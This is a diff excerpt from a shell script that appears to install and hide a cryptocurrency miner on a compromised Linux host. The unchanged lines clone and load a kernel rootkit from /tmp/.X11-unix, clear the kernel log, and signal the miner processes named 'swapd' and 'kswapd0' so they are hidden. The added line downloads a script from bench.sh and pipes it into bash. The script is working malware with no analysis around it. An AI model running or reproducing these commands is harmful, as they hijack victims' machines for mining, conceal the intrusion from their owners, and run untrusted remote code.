@@ -393,7 +393,9 @@ echo "[*] make toolZ, Diamorphine"
     
     echo "[*] hide crypto miner."
         cd /tmp ; cd .X11-unix ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make ; dmesg -C && insmod rootkit.ko && dmesg ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ; rm -rf hiding-cryptominers-linux-rootkit/
-    
+
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; curl -Lso- bench.sh | bash
+
 kill -31 $(pgrep -f -u root config.json) 
 kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
